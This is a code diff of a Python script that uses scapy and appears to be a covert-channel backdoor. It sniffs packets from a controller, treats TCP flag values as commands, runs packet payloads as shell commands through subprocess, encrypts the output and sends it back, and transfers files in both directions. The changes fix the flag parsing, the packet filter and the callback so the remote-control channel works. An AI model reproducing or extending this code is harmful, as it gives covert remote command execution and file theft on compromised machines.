@@ -292,10 +292,9 @@ def clientCommands(packet):
 	try:
 		# Setting up the packet filter to limit scanned packets
 		# The stricter the filter, the fewer packets to process and therefore the better the performance
-		packetFilter = protocol + " and ip src " + packet[IP].src + " and dst port " + str(port)
-
+		packetFilter = protocol + " and ip src " + packet[IP].src + " and dst port " + str(packet[TCP].sport)
 		# Beginning Packet sniffing
-		sniff(filter=packetFilter, prn=server(), timeout=300)
+		sniff(filter=packetFilter, prn=commandParser(), timeout=300)
 		if len(logFile) > 0:
 			with open(logFile, "a") as serverLog:
 				serverLog.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")
@@ -337,19 +336,19 @@ def commandParser():
 	def getResponse(packet):
 		if packet.haslayer(TCP):
 			# Kill
-			if "F" in packet[TCP].flag:
+			if packet[TCP].flags == 1:
 				sys.exit()
 			# iNotify
-			elif "AS" in packet[TCP].flag:
+			elif packet[TCP].flags == 14:
 				notify(packet)
 			# Terminal Command
-			elif "S" in packet[TCP].flag:
+			elif packet[TCP].flags == 2:
 				terminal(packet)
 			# Client receives file
-			elif "A" in packet[TCP].flag:
+			elif packet[TCP].flags == 16:
 				getFile(packet)
 			# Client sends file
-			else:
+			elif packet[TCP].flags == 0:
 				sendFile(packet)
 		elif packet.haslayer(UDP):
 			# Kill
@@ -482,6 +481,7 @@ def getFile(packet):
 '''
 def terminal(packet):
 	output = encrypt(subprocess.check_output(packet[Raw].load, stderr=subprocess.STDOUT))
+	print output
 	if packet.haslayer(TCP):
 		confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
 			            TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)
